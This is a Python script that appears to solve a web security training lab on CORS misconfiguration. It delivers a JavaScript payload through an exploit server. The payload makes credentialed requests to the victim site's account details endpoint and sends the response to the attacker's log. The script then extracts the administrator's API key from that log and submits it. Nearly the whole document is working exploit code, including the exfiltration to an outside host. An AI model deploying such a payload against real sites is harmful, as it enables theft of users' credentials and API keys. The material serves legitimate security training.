import requests
from bs4 import BeautifulSoup
import re
import time

# Replace these with your actual URLs
exploit_url = 'https://exploit-0af300d20353cb8490c1cedd01fe0066.exploit-server.net'  # no trailing slash
site = '0a17006a0379cb089048cf6c00d50048.web-security-academy.net'

# Start a session
s = requests.Session()

# Exploit HTML with malicious JavaScript
exploit_html = f'''<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('GET', 'https://{site}/accountDetails', true);
   req.withCredentials = true;
   req.send();

   function reqListener() {{
       location = '/log?key=' + this.responseText;
   }};
</script>'''

# Deliver the exploit to the victim
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
print("[*] Delivering exploit to victim...")
s.post(exploit_url, data=formData)

# Wait for the victim to click the link
print("[*] Waiting for victim interaction...")
time.sleep(5)

# Fetch the access log
log_url = f'{exploit_url}/log'
resp = s.get(log_url)
soup = BeautifulSoup(resp.text, 'html.parser')
pretext = soup.find('pre').text.split('\n')

# Filter for administrator log entries
admin_entries = [line for line in pretext if 'administrator' in line and '/log?key=' in line]

if admin_entries:
    print("[*] Admin log entry found:")
    print(admin_entries[0])

    # Join parts and search for API key using regex
    joined_log = ''.join(admin_entries[0].split('%22'))  # %22 is a double-quote
    match = re.search(r'"apikey":"([a-fA-F0-9]{32})"', joined_log)

    if match:
        api_key = match.group(1)
        print(f"[+] Extracted API Key: {api_key}")

        # Submit the solution
        submit_url = f'https://{site}/submitSolution'
        solution_data = { 'answer': api_key }
        r = s.post(submit_url, data=solution_data)
        print("[+] Submitted API key. Status code:", r.status_code)
    else:
        print("[-] API key not found in the log entry.")
else:
    print("[-] No administrator access log entry found.")
